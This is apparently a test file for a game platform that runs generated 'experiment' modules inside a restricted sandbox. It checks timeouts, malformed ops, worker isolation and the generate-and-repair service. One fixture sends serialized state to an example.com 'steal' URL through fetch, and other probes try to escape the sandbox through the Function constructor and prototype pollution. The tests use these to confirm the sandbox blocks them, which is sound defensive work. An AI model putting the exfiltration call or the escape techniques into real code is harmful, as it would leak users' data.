import test from 'node:test';
import assert from 'node:assert/strict';
import vm from 'node:vm';
import maze from '../v2/kits/maze/index.js';
import physics from '../v2/kits/physics/index.js';
import { composeGame, composeRenderer } from '../v2/kits/mods/compose.js';
import { runCheck, checkExperiment } from '../v2/experiments/check.js';
import { loadVmExperiment, createVmSandboxedExperiment } from '../v2/experiments/vm-sandbox.js';
import { composeExperiments, drawDisplayList } from '../v2/experiments/compose.js';
import { createSandboxedExperiment, workerSource } from '../v2/experiments/runtime.js';
import { moduleBody, cleanOps, cleanDraws } from '../v2/experiments/sandbox.js';
import { createExperimentService } from '../v2/experiments/service.js';

const mazeContent = maze.validate(maze.content.sample).content;
const breakout = physics.validate({ ...physics.content.sample, levels: physics.content.sample.levels.filter(l => l.mode === 'breakout') }).content;
const play = s => { s.phase = 'play'; s.phaseT = 0; return s; };

// A good experiment: on its button, stun (maze) or defeat (anything) the first hittable enemy; draws a ring on the player.
const GOOD = `
let rand;
export default {
  label: 'Zapper', button: true,
  init(snapshot, rng) { rand = rng; return { zaps: 0, t: 0, seed: rng() }; },
  step(state, { snapshot, input }) {
    state.t++;
    const ops = [];
    const target = (snapshot.enemies || []).find(e => e.hittable);
    if (snapshot.active && target && (input.pressed || state.t % 20 === 0)) {
      ops.push(snapshot.capabilities.includes('stun') ? { op: 'stun', id: target.id, frames: 120 } : { op: 'defeat', id: target.id });
      ops.push({ op: 'emit', name: 'hit', data: { by: 'zapper' } });
      state.zaps++;
    }
    return { state, ops };
  },
  draw(state, snapshot) {
    const p = snapshot.player;
    return p ? [{ t: 'circle', x: p.x, y: p.y, r: 0.6, color: '#7fe3ff', alpha: 0.5 }, { t: 'text', x: p.x, y: p.y - 1, text: 'zaps ' + state.zaps, color: '#fff' }] : [];
  },
};`;
const mod = body => `export default { label: 'Probe', init(snapshot, rng) { return {}; }, step(state) { return { state, ops: [] }; }, draw() { return [{ t: 'rect', x: 0, y: 0, w: 1, h: 1, color: '#fff' }]; }, ${body} };`;
const THROWS = mod(`step(state) { throw Error('boom'); }`);
const LOOPS = mod(`step(state) { for (;;) {} }`);
const BAD_OPS = mod(`step(state) { return { state, ops: [{ op: 'nuke' }, { op: 'defeat' }, { op: 'stun', id: 0, frames: 'lots' }] }; }`);
const NAN_STATE = mod(`step(state) { return { state: { x: 0 / 0 }, ops: [] }; }`);
const FETCH = mod(`step(state) { fetch('https://example.com/steal?' + JSON.stringify(state)); return { state, ops: [] }; }`);

test('a good experiment passes the headless check and its ops really apply', () => {
  const t = performance.now();
  const r = runCheck({ code: GOOD }, { kit: physics, content: breakout });
  assert.equal(r.ok, true, JSON.stringify(r.problems));
  assert.equal(r.report.frames, 600);
  assert.equal(r.report.label, 'Zapper');
  assert.equal(r.report.button, true);
  assert.ok(r.report.ops.applied > 0 && r.report.ops.byOp.defeat > 0, JSON.stringify(r.report.ops));
  assert.ok(r.report.draws.total > 0);
  assert.ok(r.report.timings.stepAvgMs < 5);
  assert.ok(performance.now() - t < 1500);
});

test('the check fails experiments that throw, loop forever, return bad ops, keep non-JSON state or touch fetch', () => {
  const run = code => runCheck({ code }, { kit: maze, content: mazeContent, frames: 120 });
  const throws = run(THROWS);
  assert.equal(throws.ok, false); assert.match(throws.problems[0].message, /step threw at frame 0: boom/);
  const t = performance.now();
  const loops = run(LOOPS);
  assert.equal(loops.ok, false); assert.equal(loops.problems[0].code, 'timeout');
  assert.ok(performance.now() - t < 400, 'an infinite loop is cut off by the per-call time limit');
  const bad = run(BAD_OPS);
  assert.equal(bad.ok, false);
  assert.ok(bad.problems.some(p => p.code === 'bad_op' && /nuke/.test(p.message)));
  assert.equal(bad.report.ops.malformed, 360);
  assert.match(run(NAN_STATE).problems[0].message, /NaN/);
  assert.match(run(FETCH).problems[0].message, /fetch is not a function/);
  assert.match(run('export const x = 1; export default {}').problems[0].message, /only "export default"/);
  assert.match(run(`import fs from 'node:fs'; ${GOOD}`).problems[0].message, /cannot import/);
  assert.match(run(mod(`step(state) { return { state, ops: [] }; }, draw() { return []; }`).replace(/draw\(\) \{ return \[\{[^\]]*\]; \}, /, '')).problems.at(-1).message, /drew nothing/);
});

test('the vm sandbox has no host APIs, clocks, code generation or Math.random', () => {
  const probe = expr => {
    const e = loadVmExperiment(`export default { init() { return { v: (() => { try { return String(${expr}); } catch (err) { return 'threw ' + err.message; } })() }; }, step(s) { return { state: s }; }, draw() { return []; } };`);
    assert.ok(!e.error, e.error); assert.ok(e.init({}).ok);
    return e.state().value.state.v;
  };
  for (const name of ['fetch', 'process', 'require', 'setTimeout', 'Date', 'performance', 'WebAssembly', 'Function', 'eval', 'SharedArrayBuffer', 'queueMicrotask', 'Buffer'])
    assert.equal(probe(`typeof ${name}`), 'undefined', name);
  assert.match(probe('Math.random()'), /threw Math.random is not available/);
  assert.match(probe(`(function () {}).constructor('return process')()`), /threw Code generation from strings disallowed/);
  assert.match(probe(`Object.getPrototypeOf(function* () {}).constructor('return 1')`), /threw Code generation/);
  assert.equal(probe('typeof Promise + typeof Array.fromAsync'), 'undefinedundefined');
  assert.match(probe(`(Array.prototype.evil = 1)`), /threw Cannot add property/);
  assert.equal(probe('(function () { return this; })() === undefined'), 'true', 'strict code gets no global this');
  // Nothing can be queued to run after a call: no promises, no async code.
  assert.match(loadVmExperiment(mod(`async init() { return {}; }`)).error, /synchronous/);
  assert.match(loadVmExperiment(mod(`init() { const f = async () => 1; return {}; }`)).error, /synchronous/);
  assert.throws(() => moduleBody('export default 1; export default 2;'), /exactly one/);
});

test('ops act on the maze through the composer: stun and defeat, one frame late', () => {
  const base = composeGame(maze, mazeContent, { seed: 2 });
  const code = mod(`step(state, { snapshot }) { const h = snapshot.enemies[0]; return { state, ops: snapshot.active && h ? [{ op: 'stun', id: h.id, frames: 200 }, { op: 'defeat', id: snapshot.enemies[1].id }] : [] }; }`);
  const { game, dispose } = composeExperiments(maze, base, composeRenderer(maze, base), [{ id: 'exp-t', label: 'Stunner', button: false, code }], { sandbox: createVmSandboxedExperiment });
  const s = play(game.createState());
  for (const h of s.hunters) Object.assign(h, { state: 'active', fright: false, stunT: 0 });
  game.step(s, {});
  assert.equal(s.hunters[0].stunT, 0, 'ops from the first step apply on the next');
  game.step(s, {});
  assert.ok(s.hunters[0].stunT > 190, `stunned (${s.hunters[0].stunT})`);
  assert.ok(['eyes', 'entering'].includes(s.hunters[1].state), 'defeated hunters go home');
  dispose();
});

test('ops act on breakout bricks; experiment buttons respect the kit and mods, and the kit never sees them', () => {
  const base = composeGame(physics, breakout, { seed: 1 });
  const { game } = composeExperiments(physics, base, composeRenderer(physics, base), [{ id: 'exp-z', label: 'Zapper', button: true, code: GOOD }], { sandbox: createVmSandboxedExperiment });
  assert.deepEqual(game.experiments.map(e => e.button), ['b'], 'physics uses a, so the experiment gets b');
  assert.ok(game.controls.some(c => c.input === 'b' && /Zapper \(experimental\)/.test(c.label)));
  const s = game.createState();
  const bricks = () => s.world.bodies.filter(b => !b.dead && b.tag === 'brick').length;
  for (let i = 0; i < 400 && s.phase !== 'play'; i++) game.step(s, { a: i % 2 === 0 });
  const before = bricks();
  for (let i = 0; i < 6; i++) game.step(s, { b: i % 2 === 0 });
  assert.ok(bricks() < before, `a press defeats a brick (${before} → ${bricks()})`);

  const modded = composeGame(maze, mazeContent, { mods: { weapon: { kind: 'projectile', ammoFrom: 'unlimited' } } });
  const two = composeExperiments(maze, modded, composeRenderer(maze, modded), [{ label: 'One', button: true, code: GOOD }, { label: 'Two', button: true, code: GOOD }, { label: 'Off', button: true, code: GOOD, check: { ok: false } }], { sandbox: createVmSandboxedExperiment });
  assert.deepEqual(two.game.experiments.map(e => [e.label, e.button]), [['One', 'b'], ['Two', null]], 'the weapon holds a; failed experiments are not run');
  let seen = null;
  const spy = { ...modded, step: (st, input) => { seen = input; return modded.step(st, input); } };
  const wrapped = composeExperiments(maze, spy, composeRenderer(maze, modded), [{ label: 'One', button: true, code: GOOD }], { sandbox: createVmSandboxedExperiment }).game;
  wrapped.step(wrapped.createState(), { a: true, b: true });
  assert.deepEqual([seen.a, seen.b], [true, false], 'the kit and mods see a but not the experiment\'s b');
});

function stubCanvas() {
  const calls = [];
  const ctx = new Proxy({ calls, canvas: { width: 800, height: 600 }, getTransform: () => ({ a: 1 }), measureText: t => ({ width: String(t).length * 6 }), createLinearGradient: () => ({ addColorStop() {} }), createRadialGradient: () => ({ addColorStop() {} }), createPattern: () => null, getImageData: () => ({ data: [] }) }, {
    get: (o, k) => (k in o ? o[k] : (...args) => { calls.push([k, ...args]); }),
    set: (o, k, v) => { o[k] = v; return true; },
  });
  return { ctx, calls };
}

test('the renderer draws the display list through render.view, with an EXPERIMENTAL badge', () => {
  const base = composeGame(maze, mazeContent, { seed: 1 });
  const { game, render } = composeExperiments(maze, base, composeRenderer(maze, base), [{ label: 'Zapper', button: true, code: GOOD }], { sandbox: createVmSandboxedExperiment });
  const s = play(game.createState());
  game.step(s, {});
  const { ctx, calls } = stubCanvas();
  render(ctx, s, { cssWidth: 800, cssHeight: 600, dt: 1 / 60, events: [], reducedMotion: true, paused: false, attract: false });
  assert.ok(render.view && typeof render.view.X === 'function', 'the kit view passes through');
  const texts = calls.filter(c => c[0] === 'fillText').map(c => c[1]);
  assert.ok(texts.includes('zaps 0'), 'the experiment text is drawn');
  assert.ok(texts.some(t => /^EXPERIMENTAL · Zapper · not play-tested$/.test(t)), texts.join('|'));
  // Mapping: world units through X/Y/s; rects normalize flipped axes.
  const { ctx: c2, calls: k2 } = stubCanvas();
  const view = { X: x => 10 + x * 20, Y: y => 500 - y * 20, s: 20, clip: { x: 0, y: 0, w: 800, h: 600 } };
  assert.equal(drawDisplayList(c2, view, cleanDraws([{ t: 'rect', x: 1, y: 1, w: 2, h: 1, color: '#f00' }, { t: 'line', x1: 0, y1: 0, x2: 1, y2: 1, color: '#fff' }, { t: 'bogus' }]).draws), 2);
  assert.deepEqual(k2.find(c => c[0] === 'fillRect').slice(1), [30, 460, 40, 20]);
  assert.ok(k2.some(c => c[0] === 'clip'));
});

test('the worker preamble removes network and host APIs before the experiment runs', () => {
  // Emulate a worker realm: forbidden APIs on the global's prototype, as in a DedicatedWorkerGlobalScope.
  const ctx = vm.createContext({});
  vm.runInContext(`
    const proto = { fetch() { return 'network'; }, XMLHttpRequest: function () {}, WebSocket: function () {}, importScripts() {}, indexedDB: {}, caches: {}, BroadcastChannel: function () {}, Worker: function () {}, setTimeout() {}, Date };
    Object.setPrototypeOf(globalThis, proto);
    globalThis.self = globalThis; globalThis.__out = []; globalThis.__listeners = [];
    globalThis.postMessage = m => __out.push(JSON.parse(JSON.stringify(m)));
    globalThis.addEventListener = (type, fn) => __listeners.push(fn);
  `, ctx);
  const code = mod(`init() { return { seen: [typeof fetch, typeof XMLHttpRequest, typeof WebSocket, typeof importScripts, typeof indexedDB, typeof caches, typeof BroadcastChannel, typeof Worker, typeof setTimeout, typeof Date, typeof postMessage].join() }; }, draw(state) { return [{ t: 'text', x: 0, y: 0, text: state.seen, color: '#fff' }]; }`);
  vm.runInContext(workerSource(code), ctx);
  vm.runInContext(`__listeners[0]({ data: { t: 'init', id: 1, snapshot: {} } }); __listeners[0]({ data: { t: 'step', id: 2, snapshot: {}, input: {} } });`, ctx);
  const out = JSON.parse(vm.runInContext('JSON.stringify(__out)', ctx));
  assert.deepEqual(out.map(m => m.t), ['loaded', 'ready', 'step']);
  assert.equal(out[2].draws[0].text, Array(11).fill('undefined').join());
});

test('the browser runtime disables a silent or failing worker and never throws into the game', () => {
  const made = [];
  class FakeWorker { constructor(url, opts) { this.url = url; this.opts = opts; this.sent = []; made.push(this); } postMessage(m) { this.sent.push(m); } terminate() { this.terminated = true; } }
  const saved = globalThis.Worker; globalThis.Worker = FakeWorker;
  try {
    let clock = 0;
    const notes = [];
    const box = createSandboxedExperiment({ label: 'Slow', code: GOOD }, { kit: maze, world: maze.world.adapter(composeGame(maze, mazeContent)), now: () => clock, onNote: n => notes.push(n) });
    const w = made[0];
    assert.equal(w.opts.type, 'module');
    box.reset({ frame: 0 });
    w.onmessage({ data: { t: 'ready', id: 1 } });
    box.post({ frame: 1 }, {});
    w.onmessage({ data: { t: 'step', id: 2, ops: [{ op: 'nuke' }, { op: 'emit', name: 'hit' }], draws: [{ t: 'circle', x: 1, y: 1, r: 1, color: '#fff' }, { t: 'oops' }] } });
    assert.equal(box.draws.length, 1, 'malformed draws are dropped');
    assert.equal(box.status.malformed, 2);
    box.post({ frame: 2 }, {});
    clock += 100; box.post({ frame: 3 }, {});
    assert.equal(box.status.disabled, false, 'a short wait is fine (the step is skipped)');
    clock += 500; box.post({ frame: 4 }, {});
    assert.equal(box.status.disabled, true);
    assert.ok(w.terminated, 'the worker is terminated');
    assert.match(notes[0], /Experiment “Slow” stopped: it stopped answering/);
    assert.deepEqual(box.draws, []);
    assert.deepEqual(box.applyPending({}, () => {}), { applied: 0, dropped: 0 });

    const thrower = createSandboxedExperiment({ label: 'Thrower', code: GOOD }, { kit: maze, world: {}, now: () => clock });
    const w2 = made[1];
    thrower.reset({}); w2.onmessage({ data: { t: 'ready', id: 1 } });
    for (let i = 0; i < 3; i++) { thrower.post({}, {}); w2.onmessage({ data: { t: 'error', id: w2.sent.at(-1).id, where: 'step', message: 'boom' } }); }
    assert.equal(thrower.status.disabled, true, 'three errors in a row disable it');
    assert.match(thrower.status.note, /kept failing \(boom\)/);
  } finally { globalThis.Worker = saved; }
  // No Worker at all (or a CSP refusal): disabled with a note, no throw.
  const none = createSandboxedExperiment({ label: 'None', code: GOOD }, { kit: maze, world: {} });
  assert.equal(none.status.disabled, true);
});

test('checkExperiment isolates the check in a worker thread', async () => {
  const r = await checkExperiment({ code: GOOD }, { kit: maze, content: mazeContent, frames: 120 });
  assert.equal(r.ok, true, JSON.stringify(r.problems));
  assert.ok(r.report.timings.isolateMs > 0);
});

test('the service generates, checks and repairs once from the problems', async () => {
  const prompts = [];
  const replies = [{ label: 'Broken', button: false, code: THROWS }, { label: 'Zapper', button: true, code: GOOD }];
  const client = { async complete({ user }) { prompts.push(user); return { text: JSON.stringify(replies[prompts.length - 1]), ms: 5, model: 'fake' }; } };
  const service = createExperimentService({ client, model: 'fake-model' });
  const record = { gameId: 'g', version: 3, doc: { schema: 'gameverse.v2.kit-game/0.1', kit: 'maze', title: 'Maze', seed: 1, content: mazeContent, mods: {} } };
  const { experiment, check, report } = await service.experiment({ record, request: 'add a zapper' });
  assert.equal(prompts.length, 2);
  assert.match(prompts[0], /World capabilities: player, enemies, blocked, defeat, stun, lives/);
  assert.match(prompts[0], /Snapshots of this game during play/);
  assert.match(prompts[1], /step threw at frame 0: boom/);
  assert.equal(check.ok, true);
  assert.equal(report.attempts.length, 2);
  assert.equal(experiment.schema, 'gameverse.v2.experiment/0.1');
  assert.deepEqual([experiment.label, experiment.button, experiment.request], ['Zapper', true, 'add a zapper']);
  assert.match(experiment.id, /^exp-[0-9a-f]{12}$/);
  await assert.rejects(service.experiment({ record: { doc: { schema: 'other' } }, request: 'x' }), /kit game/);
  assert.deepEqual(cleanOps([{ op: 'score', n: 5 }, { op: 'score', n: Infinity }]).ops, [{ op: 'score', n: 5 }]);
});
